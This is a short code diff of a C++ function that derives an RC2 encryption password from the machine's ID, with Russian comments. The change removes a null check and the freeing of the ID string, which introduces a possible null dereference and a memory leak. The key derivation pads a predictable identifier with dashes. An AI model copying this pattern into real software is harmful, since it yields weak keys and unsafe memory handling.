@@ -642,21 +642,17 @@ string UIDCrypt::GeneratePassword()
 	//Функция генерирует пароль на основе UID
 	PCHAR UID = MakeMachineID();
 	string Password;
-	if (UID)
-	{
-		Password.SetLength(RC2_DEFAULT_PASSWORD_SIZE);
 
-		// Копируем данные
-		DWORD CopySize = Min(STRA::Length(UID), RC2_DEFAULT_PASSWORD_SIZE);
-		STR::Copy(UID, Password.t_str(), 0, CopySize);
+	Password.SetLength(RC2_DEFAULT_PASSWORD_SIZE);
 
-		// В случае если UID оказался меньше необходимого
-		// размера то заполняем массив до конца
-		if (CopySize < RC2_DEFAULT_PASSWORD_SIZE)
-			m_memset(Password.t_str(), '-', RC2_DEFAULT_PASSWORD_SIZE - CopySize);
+	// Копируем данные
+	DWORD CopySize = Min(STRA::Length(UID), RC2_DEFAULT_PASSWORD_SIZE);
+	STR::Copy(UID, Password.t_str(), 0, CopySize);
 
-		STR::Free(UID);
-    }
+	// В случае если UID оказался меньше необходимого
+	// размера то заполняем массив до конца
+	if (CopySize < RC2_DEFAULT_PASSWORD_SIZE)
+		m_memset(Password.t_str(), '-', RC2_DEFAULT_PASSWORD_SIZE - CopySize);
 
 	return Password;
 }
